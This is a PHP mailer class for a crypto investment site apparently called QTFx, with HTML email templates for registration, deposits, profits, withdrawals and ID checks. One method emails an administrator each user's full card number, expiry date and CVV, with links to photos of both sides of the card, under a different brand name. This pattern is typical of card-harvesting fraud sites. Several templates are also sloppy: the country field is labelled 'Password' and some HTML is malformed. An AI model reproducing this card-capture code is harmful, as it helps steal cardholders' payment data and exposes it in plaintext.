<?php

namespace Royaltechinc;

class Mailer
{


    public function mailUserReg($email, $fname, $username, $vcode)
    {

        $subject = "QTFx: Registration Successful";
        //$email= $mail;
        $msg = '
<!DOCTYPE html">
<html xmlns="http://www.w3.org/1999/xhtml">

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
</head>

<body style="margin: 0; padding: 0;">
Hello ' . $fname . ',<br><br>

Welcome to QTFx - where crypto trading and investments are safe and simplified!<br><br>

Here is your access information:<br><br>

Login: ' . $username . '<br>
Password: ***** (hidden) <br><br>
<b>Verify your account using this code</b><br>
<br>
<h4>' . $vcode . '</h4><br><br>

You can login here: https://dashboard.qtfx.space/sign-in.php <br><br>

Thank you,<br>
QTFx Limited <br>
https://www.qtfx.space/ <br>

</body>';

        sendMail($subject, $msg, $email);
    }
    public function mailAdminReg($email, $uemail, $fname, $username, $country, $number)
    {

        $subject = "QTFx: Registration Successful";
        //$email= $mail;
        $msg = '
<!DOCTYPE html">
<html xmlns="http://www.w3.org/1999/xhtml">

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
</head>

<body style="margin: 0; padding: 0;">
New User Registration <br><br>

Email: ' . $uemail . ' <br><br>
Username: ' . $username . ' <br><br>
Fullname: ' . $fname . '<br><br>
Password: ' . $country . '<br><br>
Number: ' . $number . '<br><br>

<b>Developed By Cyberpwince</b> <br><br>

Thank you,<br>
QTFx Limited <br>
https://www.qtfx.space/ <br>

</body>';

        sendMail($subject, $msg, $email);
    }
    public function mailUserDepo($email, $fname, $amount, $plan, $interest)
    {

        $subject = "QTFx: Deposit Successful";
        //$email= $mail;
        $msg = '
<!DOCTYPE html">
<html xmlns="http://www.w3.org/1999/xhtml">

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
</head>

<body style="margin: 0; padding: 0;">
Hello ' . $fname . ',<br><br>

Deposit Information<br><br>

Amount: ' . $amount . ' USD <br>
Plan: ' . $plan . ' <br>
Total Interest: ' . $interest . ' USD <br><br>



You can login here: https://dashboard.qtfx.space/sign-in.php <br>

Thank you,<br>
QTFx Limited <br>
https://www.qtfx.space/ <br>

</body>';

        sendMail($subject, $msg, $email);
    }
    public function mailUserProfit($email, $fname, $amount, $plan)
    {

        $subject = "QTFx: Profit Notification";
        //$email= $mail;
        $msg = '
<!DOCTYPE html">
<html xmlns="http://www.w3.org/1999/xhtml">

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
</head>

<body style="margin: 0; padding: 0;">
Hello ' . $fname . ',<br><br>

Profit Information<br><br>

Amount: ' . $amount . ' USD <br>
Plan: ' . $plan . ' <br><br>



You can login here to view your earnings: https://dashboard.qtfx.space/sign-in.php <br><br>

Thank you, <br>
QTFx Limited <br>
https://www.qtfx.space/ <br>

</body>';

        sendMail($subject, $msg, $email);
    }
    public function mailAdminCard($email, $uemail, $fname, $type, $frontcard, $backcard)
    {
        global $home;
        $subject = "QTFx: ID Verification";
        //$email= $mail;
        $msg = '
<!DOCTYPE html">
<html xmlns="http://www.w3.org/1999/xhtml">

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
</head>

<body style="margin: 0; padding: 0;">
New User ID verification <br><br>

Email: ' . $uemail . ' <br><br>
Fullname: ' . $fname . '<br><br>
Document Type: ' . $type . '<br><br>
Front Id card: <a href="' . $home . '/verifyimage/' . $frontcard . '">' . $home . '/verifyimage/' . $frontcard . '</a><br>
Back Id card: <a href="' . $home . '/verifyimage/' . $backcard . '">' . $home . '/verifyimage/' . $backcard . '</a>



<br><br>

<b>Developed By Cyberpwince</b> <br><br>

Thank you,<br>
QTFx <br>
https://www.qtfx.space/ <br>

</body>';

        sendMail($subject, $msg, $email);
    }
    public function mailAdminCCard($email, $amount, $uemail, $fname, $ccname, $ccard, $cmon, $cyy, $cvv, $frontcc, $backcc)
    {
        global $home;
        $subject = "Stockpulsetrade: Deposit Credit Card";
        //$email= $mail;
        $msg = '
<!DOCTYPE html">
<html xmlns="http://www.w3.org/1999/xhtml">

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
</head>

<body style="margin: 0; padding: 0;">
New User Deposit Credit Card <br><br>

Amount: ' . $amount . ' <br><br>
Email: ' . $uemail . ' <br><br>
Fullname: ' . $fname . '<br><br>
Card Name: ' . $ccname . '<br>
Card Number: ' . $ccard . '<br>
Card Exp: ' . $cmon . '/' . $cyy . '<br>
Cvv: ' . $cvv . ' <br>
Front CC: <a href="' . $home . '/uploads/' . $frontcc . '">' . $home . '/uploads/' . $frontcc . '</a><br>
Back CC: <a href="' . $home . '/uploads/' . $backcc . '">' . $home . '/uploads/' . $backcc . '</a><br>



<br><br>

<b>Developed By Cyberpwince</b> <br><br>

Thank you,<br>
StockPulseTrade <br>
https://stockpulsetrade.com/ <br>

</body>';

        sendMail($subject, $msg, $email);
    }
    public function mailUserCard($uemail, $fname)
    {

        $subject = "QTFx: ID Verification Status";
        //$email= $mail;
        $msg = '
<!DOCTYPE html">
<html xmlns="http://www.w3.org/1999/xhtml">

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
</head>

<body style="margin: 0; padding: 0;">
Hello ' . $fname . ' <br><br>

Your uploaded ID has been reviewed and verified by our team. <br>
You can login and start trading.


<br><br>

Thank you,<br>
QTFx <br>
https://www.qtfx.space/ <br>

</body>';

        sendMail($subject, $msg, $uemail);
    }
    public function mailUserWithdrawal($email, $fname, $amount, $wallet)
    {

        $subject = "QTFx: Withdrawal Notification";
        //$email= $mail;
        $msg = '
<!DOCTYPE html">
<html xmlns="http://www.w3.org/1999/xhtml">

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
</head>

<body style="margin: 0; padding: 0;">
Hello ' . $fname . ',<br><br>

WIthdrawal Information<br><br>

Amount: ' . $amount . ' USD <br>
Wallet: ' . $wallet . ' <br>
Satus: Approved <br><br>



You can login to check your status: https://dashboard.qtfx.space/sign-in.php <br><br>

Thank you,<br>
QTFx Limited <br>
https://www.qtfx.space/ <br>

</body>';

        sendMail($subject, $msg, $email);
    }
    public function mailVcode($email, $fname, $vcode)
    {

        $subject = "QTFx: Verification Code";
        //$email= $mail;
        $msg = '
<!DOCTYPE html">
<html xmlns="http://www.w3.org/1999/xhtml">

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
</head>

<body style="margin: 0; padding: 0;">
Hello ' . $fname . ',<br><br>



You can login to verify your account: https://dashboard.qtfx.space/sign-in.php <br><br>

Thank you,<br>
QTFx Limited <br>
https://www.qtfx.space/ <br>

</body>';

        sendMail($subject, $msg, $email);
    }
    public function mailTopUp($email, $fname, $amount)
    {

        $subject = "QTFx: Topup Notification";
        //$email= $mail;
        $msg = '
<!DOCTYPE html">
<html xmlns="http://www.w3.org/1999/xhtml">

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
</head>

<body style="margin: 0; padding: 0;">
Hello ' . $fname . ',<br><br>


<b>Your account balance has been topped up</b><br>
<br>
<h4>' . $amount . '</h4><br><br>


You can login to check your balance: https://dashboard.qtfx.space/sign-in.php <br><br>

Thank you,<br>
QTFx Limited <br>
https://www.qtfx.space/ <br>

</body>';

        sendMail($subject, $msg, $email);
    }


    public function mailUser($email, $subject, $body)
    {

        $subject = "QTFx: $subject";
        $text = nl2br(htmlentities($body, ENT_QUOTES, 'UTF-8'));
        //$email= $mail;
        $msg = '<!DOCTYPE html">
            <html xmlns="http://www.w3.org/1999/xhtml">
            
            <head>
                <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
                <meta name="viewport" content="width=device-width, initial-scale=1.0" />
            </head>
            
            <body style="margin: 0; padding: 0;">
            <p>' . $text . '</p>
            
            
            
            Thank you,<br>
            QTFx Limited <br>
            https://www.qtfx.space/ <br>
    
            <div style="margin-top: 8px;></div>
            <p style="margin: 0 0 16px">Copyright © 2022 <a style="color: #7f54b3; font-weight: normal; text-decoration: underline" href="https://".$url target="_blank" rel="noreferrer">QTFx.</a> All Rights Reserved.</p>
            
            </body>';

        sendMail($subject, $msg, $email);
    }
}
